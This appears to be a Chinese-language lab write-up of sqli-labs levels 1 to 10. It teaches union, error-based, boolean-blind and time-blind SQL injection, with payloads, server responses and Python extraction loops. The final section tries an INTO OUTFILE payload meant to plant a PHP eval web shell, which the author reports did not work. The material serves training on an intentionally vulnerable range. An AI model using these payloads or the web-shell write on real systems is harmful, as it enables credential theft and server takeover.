---
title: "sql注入:sqli-labs前十关"
description: sqli-lab前十关wp,联合查询注入,报错注入,布尔盲注,时间盲注
pubDate: 2026-11-12T11:19
tags: [sql注入, 布尔盲注, 时间盲注, 联合查询注入, 报错注入, 数据库, sqil-lab]
emoji: "📝"
hue: 255
featured: false
draft: false
---

> 这篇是sqli-lab前十关整理。
## 零: 说明
自定义函数huixian()函数原型如下:
```python
import requests

def huixian(res):
    print("请求状态码如下:")
    print(res.status_code," ", res.reason)
    print()
    print("==================================================")
    print("!请求头!信息如下:")
    for k,v in res.request.headers.items():
        print(f"{k}:{v}")
    print()
    print("==================================================")
    print("!响应头!信息如下:")
    for k,v in res.headers.items():
        print(f"{k}:{v}")
    print()
    print("==================================================")
    print("响应体内容如下:")
    print(res.text)
    print()
    print("==================================================")
```
## 一、Less-1：单引号 + 联合查询

```python
payload = "1'"
# 报错: You have an error in your SQL syntax; check the manual that corresponds to
#       your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

payload = "-1' UNION SELECT 1,database(),3 -- "
# 回显: Your Login name:security<br>Your Password:3
```

说明：

- 先用 `?id=1'` 试一下，页面报错，说明闭合点是单引号，这是字符型注入。
- `-1` 是故意的：`SELECT * FROM users WHERE id='-1'` 查不到任何行，联合查询的结果才有位置显示。如果写 `1`，原查询已经占住了第一行，union 的结果根本出不来（这个坑我在第四关又踩了一次）。
- `UNION SELECT 1,database(),3` 里的 `1,2,3` 是在试列数。填三个不报错，说明 `users` 表也是三列；报错就是列数不对。
- 回显里只有 `Login name` 和 `Password` 两个位置，第 1 列被页面吃掉了（它只 echo 第 2、3 列），所以把 `database()` 放在第 2 列，能直接看到库名。

拿到库名之后就是一路往里挖，换掉 `SELECT` 后面的表达式就行：

```python
payload = "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' #"
# 回显: Your Login name:emails,referers,uagents,users<br>Your Password:3

payload = "-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' AND table_schema='security' #"
# 回显: Your Login name:id,username,password<br>Your Password:3

payload = "-1' UNION SELECT 1,group_concat(username, '|', password),3 FROM users #"
# 回显: Your Login name:Dumb|Dumb,Angelina|I-kill-you,Dummy|p@ssword,secure|crappy,
#       stupid|stupidity,superman|genious,batman|mob!le,admin|admin,admin1|admin1,
#       admin2|admin2,admin3|admin3,dhakkan|dumbo,admin4|admin4<br>Your Password:3
```

说明：

- 三条对应"查表 → 查列 → 拿数据"，`group_concat` 把多行拼成一行，所以能一次看完。最后那条长回显为了排版在逗号处换行了，实际是一行。
> 注:这个group_concat的返回值字节数最多为1024,超出部分会被截断
- 这四张表（emails、referers、uagents、users）和"库 → 表 → 列 → 行"的逻辑树是对应的。逻辑树如下:

```text
MySQL 数据库服务器（整座图书馆）
│
├── 📚 用户库 (Database) —— 你自己建的房间
│    └── security (靶场用的库)
│         │
│         ├── 🗄️ 表 (Table) —— 房间里的文件柜
│         │    ├── users (用户表)
│         │    │    ├── 📑 列 (Column) —— 柜子上的抽屉标签
│         │    │    │    ├── id (整数型)
│         │    │    │    ├── username (字符串)
│         │    │    │    └── password (字符串)
│         │    │    │
│         │    │    └── 📄 行 (Row) —— 抽屉里的具体档案（数据）
│         │    │         ├── 第1行: 1, Dumb, Dumb
│         │    │         └── 第2行: 2, Angelina, I-kill-you
│         │    │
│         │    ├── emails (邮箱表)
│         │    ├── uagents (浏览器表)
│         │    └── referers (来源表)
│         │
│         └── (其他表...)
│
└── 🗃️ 系统库 (System Database) —— 图书馆管理员专用的登记处
     │
     ├── information_schema (核心！记录所有库、表、列信息的“户籍系统”)
     │    │
     │    ├── SCHEMATA (记录所有数据库名的表)
     │    │    └── 📑 列: schema_name (库名，比如 security)
     │    │
     │    ├── TABLES (记录所有表名的表)
     │    │    ├── 📑 列: table_schema (属于哪个库)
     │    │    ├── 📑 列: table_name (表叫什么名字，比如 users)
     │    │    └── 📑 列: engine (用的什么引擎)
     │    │
     │    └── COLUMNS (记录所有列名的表)
     │         ├── 📑 列: table_schema (属于哪个库)
     │         ├── 📑 列: table_name (属于哪个表)
     │         └── 📑 列: column_name (列叫什么名字，比如 username)
     │
     ├── mysql (记录数据库账号、密码、权限的系统库)
     ├── performance_schema (性能监控用的库)
     └── sys (给程序员看性能指标的视图库)
```

- 这里的 `WHERE table_schema='security'` 只是为了干净。我后来把它删掉试过，能看到 mysql 库下的系统表，但 `group_concat` 有长度上限，一次只吐一部分；真正想看全，就把条件改成 `table_schema NOT IN ('information_schema','mysql','performance_schema','sys')`，只看用户自建的库。
- 库名同理：把 `FROM information_schema.tables` 换成 `FROM information_schema.schemata`，`group_concat(table_name)` 换成 `group_concat(schema_name)`，就是查库。

## 二、Less-2：数字型

```python
payload = "1 and 1 = 1"
# 回显: Your Login name:Dumb<br>Your Password:Dumb

payload = "1 and 1 = 2"
# 回显: 页面只剩欢迎语，没有 Login name 也没有 Password
```

说明：同样的 `id=1`，后面接 `and 1=1` 有数据、接 `and 1=2` 没数据，说明 `and` 后面的条件真的被数据库执行了，参数是拼进 SQL 的。这一关源码是 `id=$id`，外面没有引号，属于数字型。

```python
payload = "-1' UNION SELECT 1,2,3 #"
# 报错: You have an error in your SQL syntax; check the manual that corresponds to
#       your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3 # LIMIT 0,1' at line 1
```

说明：报错里我们发的那一截是空的引号对，说明多余的单引号把语法搞坏了，数字型不需要闭合引号。去掉引号再发：

```python
payload = "-1 UNION SELECT 1,2,3 #"
# 回显: Your Login name:2<br>Your Password:3
```

说明：联合查询通了。后面跟第一关完全一样，`database()`、`group_concat(table_name)` 都能直接套，只是 payload 里不要带引号。

## 三、Less-3：闭合里多一个右括号

```python
payload = "-1'"
# 报错: You have an error in your SQL syntax; check the manual that corresponds to
#       your MySQL server version for the right syntax to use near ''-1'') LIMIT 0,1' at line 1
```

说明：我发的只有 `-1'`，报错里却多出一个 `')`，说明源码是 `id=('$id')`，单引号外面还套了一层括号。所以真正要闭合的是 `')`，不是 `'`。

```python
payload = "-1') UNION SELECT 1, database(),3 #"
# 回显: Your Login name:security<br>Your Password:3
```

说明：补上 `)` 再用 `#` 把后面的 `') LIMIT 0,1` 注释掉，就变成了 `WHERE id=('-1')` 的形态。这一关和第一关只差一个括号，后面的挖法照抄。

## 四、Less-4：双引号 + 右括号

```python
payload = '1"'
# 报错: You have an error in your SQL syntax; check the manual that corresponds to
#       your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
```

说明：报错里有两层东西：一是我发的 `"`，二是源码自带的 `")`。去看源码就明白了：`$id='"'.$id.'"';` 先把 id 用双引号包起来，再 `id=($id)` 拼进 SQL，所以闭合是 `")`。

```python
payload = '1") UNION SELECT 1, database(), 3 # '
# 回显: Your Login name:Dumb<br>Your Password:Dumb

payload = '-1") UNION SELECT 1, database(), 3 # '
# 回显: Your Login name:security<br>Your Password:3
```

说明：上面那条就是我一开始写错的版本，页面返回的是 `id=1` 的正常数据，联合查询一行都没出来。因为 `LIMIT 0,1` 只取第一行，`id=1` 本来就有数据，union 的结果自然轮不上。把开头换成 `-1` 才通，这也是第一关那个技巧的复用。

## 五、Less-5：报错注入

```python
payload = "1' AND extractvalue(1, concat(0x7e, (SELECT database()))) # "
# 回显: XPATH syntax error: '~security'
```

说明：这一关页面只剩 `You are in...........`，查到了也什么都不显示，联合查询没有位置可以回显。于是换思路：让数据库自己报错，把数据塞进报错信息里带出来。

- `extractvalue(xml_doc, xpath)` 本来是查 XML 数据的，`xml_doc` 填什么都行，重点是第二个参数得是合法路径。
- `concat(0x7e, (SELECT database()))` 把 `~` 和库名拼起来，`0x7e` 就是 `~`。`~` 不是合法路径，函数就报错，报错信息里带着拼接后的内容。
- 回显是 `XPATH syntax error: '~security'`，`~` 后面就是数据。
- 同一个位置的函数是 `updatexml(xml_doc, xpath, new_xml)`，思路一样。

表名、列名就是把 `database()` 换成对应的子查询。`le5.py` 里这两条还只是注释，我在这里实际跑了一遍：

```python
payload = "-1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'))) #"
# 回显: XPATH syntax error: '~emails,referers,uagents,users'

payload = "-1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'))) #"
# 回显: XPATH syntax error: '~USER,CURRENT_CONNECTIONS,TOTAL_'

payload = "-1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema='security'))) #"
# 回显: XPATH syntax error: '~id,username,password'
```

说明：

- 第二条的回显是错的，不是 `users` 表的列。因为它只限定了 `table_name='users'`，没限定库，`information_schema.columns` 里别的库也有叫 users 的表（performance_schema 里就有一堆），结果把 `USER`、`CURRENT_CONNECTIONS` 这些也带进来了。补上 `AND table_schema='security'` 才是对的，见第三条。
- 这三条都短，没碰到长度上限。真拿数据就会撞上 32 字符的墙：

```python
payload = "-1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(username) FROM users))) #"
# 回显: XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stup'
```

说明：13 个用户名拼起来远不止 32 个字符，`~` 加后面的内容一共只显示 32 个字符，`stup` 后面被截断了，所以大结果要用 `substr` 分批取。

## 六、Less-6：双引号的报错注入

```python
payload = '1"'
# 报错: You have an error in your SQL syntax; check the manual that corresponds to
#       your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1

payload = '1" AND extractvalue(1, concat(0x7e, (SELECT database()))) # '
# 回显: XPATH syntax error: '~security'
```

说明：和第五关一样的道理，只不过这次包住 id 的是双引号（源码 `$id='"'.$id.'"';` 再 `id=$id`），所以闭合用 `"`。函数、32 字符上限、分批都和第五关一样。

> 注意：第五、六关的页面 `else` 分支里有 `print_r(mysql_error());`，所以 MySQL 的报错能被打印出来。`error_reporting(0)` 关掉的是 PHP 自己的报错，关不掉程序主动打印的字符串。

## 七、Less-8：布尔盲注

```python
payload = "1' AND 1 = 1 #"
# 回显: You are in...........（页面里有 "are"，😊）

payload = "1' AND 1 = 2 #"
# 回显: 页面没有 you are in（😭）
```

说明：这一关页面只有两种状态，条件为真时输出 `You are in...........`，为假时什么都不输出。所以我用 `"are" in res.text` 当布尔值：

```python
if "are" in res.text:
    print("😊")
else:
    print("😭")
```

说明：`#` 一样要带，把后面的 `' LIMIT 0,1` 注释掉。

猜库名就是一位一位问，先问长度：

```python
for n in range(1, 21):
    payload = f"1' AND length(database()) = {n} -- "
    if "are" in res.text:
        print(f"😊 {n}")
```

说明：

- 输出是 `😭 1`、`😭 2` … `😭 7`、`😊 库名长度 = 8`，说明库名 8 个字节。`length()` 返回的是字节长度。
- SQL 里判断相等用一个等号，写 `==` 会报错。
- 这 8 次循环就花了 20 秒左右（这个靶场每次请求固定 2 秒左右），所以盲注是真的慢。

```python
for i in range(1, 9):
    for j in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_":
        payload = f"1' AND substr(database(), {i}, 1) = '{j}' -- "
```

说明：

- 输出 `security`，这一段实测 266.1 秒（120 次请求，每次 2 秒）。
- `substr(str, pos, len)` 的 `pos` 从 1 开始，跟 Python 的 0 不一样；`pos` 给负数就是倒着截。
- 这里有个容易漏的点：SQL 比较默认大小写不敏感，字典里小写先命中就 `break` 了，真有大写字母会被漏掉。想让比较区分大小写，就在前面加 `binary`：

```python
payload = "1' AND binary substr(database(), 1, 1) = 's' -- "
# 回显: You are in...........（真）

payload = "1' AND binary substr(database(), 1, 1) = 'S' -- "
# 回显: 页面没有 you are in（假）
```

说明：加 `binary` 之后 `s` 和 `S` 就区分开了，这也是为什么字典里有大小写、却只测出小写的原因——不 `binary` 的话 `s` 先命中就 `break` 了。

## 八、Less-9：时间盲注

```python
payload = "1"                     # You are in...........
payload = "-1"                    # You are in...........
payload = "-10086"                # You are in...........
payload = "nihao"                 # You are in...........
payload = "1'"                    # You are in...........
```

说明：五连一样，当时我就觉得"初见端倪"了。去看源码，`if($row)` 和 `else` 打的是同一句 `You are in...........`，报错又被 `error_reporting(0)` 关了。第八关的布尔判断在这一关彻底失效——页面不会再给你任何 0/1。

那还剩什么信息？时间。MySQL 有 `SLEEP(秒数)`，谁调用它，语句就睡多久再返回，我用它当 0 和 1：

```python
def qingqiu(payload):
    start = time.time()
    res = requests.get(url, params={"id":payload})
    end = time.time()
    return res, round(end - start, 2)

res, t = qingqiu("1' AND SLEEP(3) -- ")
# t = 5.08 秒
```

说明：实测三次对比：

| 请求 | 耗时 | 结论 |
| --- | --- | --- |
| `id=1`（基线） | 2.07 秒 | 靶场本身就慢 |
| `1' AND SLEEP(3) -- ` | 5.08 秒 | 睡了，单引号闭合 |
| `1" AND SLEEP(3) -- ` | 2.05 秒 | 没睡，双引号不对 |

- **`--` 后面必须有空格**，不然它只是两个减号。实测 `SLEEP(2)--` 是 2.05 秒（没睡），`SLEEP(2)-- ` 是 4.08 秒（睡了），`SLEEP(2)#` 是 4.05 秒。`#` 也行。
- 判断阈值不能死写"超过 5 秒就是真"，因为基线本身就有 2 秒。我写成 `t >= 延迟 + 1`，两边各留 1 秒余量。

```python
for n in range(1, 21):
    payload = f"1' AND IF(length(database()) = {n}, SLEEP(2), 0) -- "
    if zhen(payload):
        print(f"😊 库名长度 = {n}")
        break
# 输出: 😭 1 … 😭 7、😊 库名长度 = 8
```

说明：`IF(条件, SLEEP(2), 0)` 是整件事的核心：条件成立就睡 2 秒，不成立直接返回。长度猜出来是 8，和第八关对上了。这里的 `zhen()` 就是拿 `qingqiu()` 量到的耗时跟基线比，超过 3 秒算真。

```python
zidian = "abcdefghijklmnopqrstuvwxyz0123456789_-"
for i in range(1, 9):
    for j in zidian:
        payload = f"1' AND IF(SUBSTR(database(), {i}, 1) = '{j}', SLEEP(2), 0) -- "
        if zhen(payload):
            kuming += j
            break
# 输出: security（实测 263.0 秒）
```

说明：先照搬第八关的字典法，结果 `security`，但这一段实测跑了 **263.0 秒**。因为这 8 个字母一共发了 120 个请求（每个字符在字典里的位置之和），前面试错的每一次都在干等 2 秒。第八关同样的字典法秒回，到这里一个字符就要 2 秒，等于把"慢"放大了一百倍。

```python
payload = f"1' AND IF(ASCII(SUBSTR(database(), {i}, 1)) > {mid}, SLEEP(2), 0) -- "
# 二分用，一个字符 7 次请求就能定下来
```

说明：既然能问"是不是等于"，就能问"是不是大于"。把字符换成 `ASCII()`，一个字符在 0~127 之间，二分 7 次就能定下来。我把"二分猜长度 + 二分猜每个字符"包成一个 `baomang(sql)`，实测跑出：

```
print(baomang("SELECT database()"))                       # 库名: security
print(baomang("SELECT username FROM users LIMIT 0,1"))    # users 表第一个用户名: Dumb
```

说明：`Dumb` 和第一关看到的第一行一致。想继续挖表名、列名、整张表，换掉 `baomang()` 里那句 SQL 就行，但会很慢：一个字符 7 次请求、一次 2~4 秒，`users` 表 13 个用户的 `group_concat(username,0x3a,password)` 是 188 个字符（这两个数在第一关量的），估算要跑一个多小时。所以时间盲注是最后手段，能联合查询就别盲注。

> 补充：ASCII 二分只适合 ASCII 数据。要是有中文（UTF-8 一个汉字 3 个字节），得改用 `HEX()` 按字节取，再两个一组拼回来。

## 九、Less-10：双引号的时间盲注

```python
payload = '1" AND SLEEP(3) -- '      # 5.06 秒，睡了
payload = "1' AND SLEEP(3) -- "      # 2.04 秒，没睡
payload = '1") AND SLEEP(3) -- '     # 2.04 秒，没睡
```

说明：这一关和第九关是双胞胎，页面同样只有一句 `You are in...........`，唯一的区别是闭合符号。源码先 `$id = '"'.$id.'"';` 再用 `id=$id` 拼进 SQL，所以 payload 开头是 `1"`。

- 第三条要注意：多补一个 `)` 反而废掉。第四关源码里有括号，才需要补 `)`；这一关没有。
- 剩下的直接复用第九关的 `baomang()`：

```python
print(baomang("SELECT database()"))                       # 库名: security
print(baomang("SELECT COUNT(*) FROM users"))              # users 表条数: 13
print(baomang("SELECT username FROM users LIMIT 0,1"))    # users 表第一个用户名: Dumb
```

说明：三个结果和前面几关都对得上（`Dumb` 是第一行，13 是第一关数出来的用户数）。

第九关和第十关放一起对照：

| | 闭合 | 源码里的 id | payload 开头 | 判断信号 |
| --- | --- | --- | --- | --- |
| Less-9 | `'` | `id='$id'` | `1' AND IF(...) -- ` | 响应耗时 |
| Less-10 | `"` | `$id = '"'.$id.'"'` | `1" AND IF(...) -- ` | 响应耗时 |

说明：光看页面永远分不出 9 和 10，必须靠时间测闭合。这也是这两关唯一需要动脑的地方。

## 十、速查表

我把源码 SQL 都从 `index.php` 里翻出来对过一遍，整理成这张表（第七关没整理进来，见最后一节）：

| 关卡 | 源码里的 SQL | 类型 | 闭合 | 数据通道 |
| --- | --- | --- | --- | --- |
| Less-1 | `id='$id'` | 字符型 | `'` | 联合查询 |
| Less-2 | `id=$id` | 数字型 | 无 | 联合查询 |
| Less-3 | `id=('$id')` | 字符型 + 括号 | `')` | 联合查询 |
| Less-4 | `$id='"'.$id.'"'; id=($id)` | 双引号 + 括号 | `")` | 联合查询 |
| Less-5 | `id='$id'` | 字符型 | `'` | 报错注入 |
| Less-6 | `$id='"'.$id.'"'; id=$id` | 双引号 | `"` | 报错注入 |
| Less-8 | `id='$id'` | 字符型 | `'` | 布尔盲注 |
| Less-9 | `id='$id'` | 字符型 | `'` | 时间盲注 |
| Less-10 | `$id='"'.$id.'"'; id=$id` | 双引号 | `"` | 时间盲注 |

说明：这九关其实就是一条"数据通道"的降级链：**回显 → 报错 → 布尔 → 时间**。页面给出的信息越少，就往下降一级，payload 的壳子（`-1`、`#`、列数、让原查询空掉）基本不变。

## 十一、踩坑清单

- **`--` 后面要有空格**：`SLEEP(2)--` 不生效，`SLEEP(2)-- ` 才生效（2.05 秒 vs 4.08 秒）。`#` 也行，但要靠 requests 编码成 `%23`，手写 URL 会被浏览器当锚点。
- **`UNION` 前面那段要故意查不到**：`LIMIT 0,1` 只回第一行，前半段有数据就轮不到 union（第四关踩过，用 `-1` 解决）。
- **列数必须一致**：`UNION SELECT 1,2,3` 是在试列数，`users` 表三列。
- **只写 `table_name` 不够，要一起限 `table_schema`**：第五关第二条列名 payload 就是这个坑，回显里冒出 `USER`、`CURRENT_CONNECTIONS` 这种不属于 `users` 表的列。
- **`error_reporting(0)` 不等于没有报错**：1~6 关的 `print_r(mysql_error())` 会主动打印 MySQL 报错，后面的关卡这行被注释掉了。先分清是哪一种"没报错"。
- **盲注的慢是固定的**：每个请求 2 秒打底，时间盲注先量基线再定阈值，能用二分就别用字典。
- **大小写**：SQL 比较默认不区分大小写，字典法要加 `binary`。
- **`extractvalue` 一次 32 字符**：大结果要 `substr` 分批。
- **`group_concat` 有长度上限**：一次看不全就先过滤库，或者分批截断。

## 十二、第七关还没搞明白

```python
payload = "1"          # -> You are in.... Use outfile......
payload = "-1'"        # -> You have an error in your SQL syntax
payload = "1')) #"     # -> You are in.... Use outfile......
payload = "-1')) #"    # -> You have an error in your SQL syntax
```

说明：这一关我到现在也没捋明白，先把现象记在这。页面只有两种固定的话，查得到是 `You are in.... Use outfile......`，查不到是 `You have an error in your SQL syntax`，查什么数据都不显示。`1')) #` 的回显和 `1` 一样，说明右边多出 `'))`，闭合应该是 `'))`；可 `-1')) #` 又回到了那句 error，而 `-1` 本来就查不到行，所以这句 error 到底代表"语法错"还是"没查到"，我分不清。

```python
payload = "-1')) UNION SELECT 1,2,3 #"
# -> You are in.... Use outfile......（1,2,3 没有显示出来）
```

说明：补完闭合之后联合查询是通的（页面变成 `Use outfile`），但 `1,2,3` 一个都不显示。照页面的提示去写文件：

```python
payload = r"-1')) UNION SELECT 1,2,'<?php @eval($_POST[\"cmd\"]);?>' INTO OUTFILE 'C:/D/phpstudyyy/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' -- "
# -> You have an error in your SQL syntax，Less-7 目录里仍然只有 index.php 和 result.txt
```

说明：页面还是那句 error，`shell.php` 也没生成。payload 我自己觉得语法是对的（联合查询那句能变真，说明闭合和列数都对），但文件就是出不来，卡在哪我还没想明白。先把这题挂着，后面回来补。


